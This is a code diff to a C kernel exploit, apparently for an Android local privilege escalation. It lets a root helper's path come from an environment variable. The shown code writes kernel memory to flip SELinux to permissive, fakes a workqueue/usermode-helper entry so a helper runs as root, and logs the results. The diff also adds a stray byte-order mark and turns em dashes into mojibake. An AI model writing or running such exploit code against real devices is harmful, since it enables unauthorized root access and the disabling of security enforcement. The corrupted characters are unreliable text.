@@ -1,4 +1,4 @@
-#include "common.h"
+﻿#include "common.h"
 
 #include <stdlib.h>
 #include <sys/un.h>
@@ -109,13 +109,20 @@ static int root_socket_ready(void) {
 }
 
 static int install_workqueue_umh_root(int fd) {
+  /* RMG app compatibility: the app stages the helper wherever it can and
+   * passes the absolute path via CVE43499_ROOT_HELPER (InstallViewModel
+   * shizukuEnvironment).  Fall back to the compiled-in default for plain
+   * adb usage where /data/local/tmp is populated by hand. */
+  const char *helper_env = getenv("CVE43499_ROOT_HELPER");
+  const char *helper_path =
+      (helper_env && *helper_env) ? helper_env : ROOT_UMH_PATH;
   uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
   uint8_t permissive = 0;
   uintptr_t fake_work_addr = page_base + ROOT_UMH_WORK_OFF;
   uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
   struct umh_kernel_data umh_data;
   memset(&umh_data, 0, sizeof(umh_data));
-  snprintf(umh_data.path, sizeof(umh_data.path), "%s", ROOT_UMH_PATH);
+  snprintf(umh_data.path, sizeof(umh_data.path), "%s", helper_path);
   snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
   uintptr_t completion_addr =
       umh_data_addr + offsetof(struct umh_kernel_data, completion);
@@ -143,17 +150,17 @@ static int install_workqueue_umh_root(int fd) {
    * Split the causes up front: (a) helper missing or not executable by the
    * kernel umh context -> the stat/X_OK log; (b) SELinux still enforcing ->
    * the enforcing-byte readback.  The byte must be selinux_state.enforcing
-   * (target.h) — the old selinux_enforcing_boot offset was a write that
+   * (target.h) â€” the old selinux_enforcing_boot offset was a write that
    * silently changed nothing. */
   {
     struct stat st;
-    if (stat(ROOT_UMH_PATH, &st) != 0) {
+    if (stat(helper_path, &st) != 0) {
       pr_warning("root umh helper stat failed errno=%d (%s)\n", errno,
-                 ROOT_UMH_PATH);
+                 helper_path);
     } else {
       pr_info("root umh helper mode=%o uid=%u gid=%u x_ok=%d\n",
               st.st_mode & 07777, st.st_uid, st.st_gid,
-              access(ROOT_UMH_PATH, X_OK) == 0);
+              access(helper_path, X_OK) == 0);
     }
   }
 
@@ -168,7 +175,7 @@ static int install_workqueue_umh_root(int fd) {
   kernel_read_data(fd, selinux_addr, &enf_after, sizeof(enf_after));
   pr_info("root umh selinux enforcing byte %u -> %u (addr=%016zx)%s\n",
           enf_before, enf_after, selinux_addr,
-          enf_after ? " — STILL ENFORCING" : "");
+          enf_after ? " â€” STILL ENFORCING" : "");
 
   uintptr_t wq_slot = data_addr(SYSTEM_UNBOUND_WQ);
   uintptr_t wq = root_read64(fd, wq_slot);
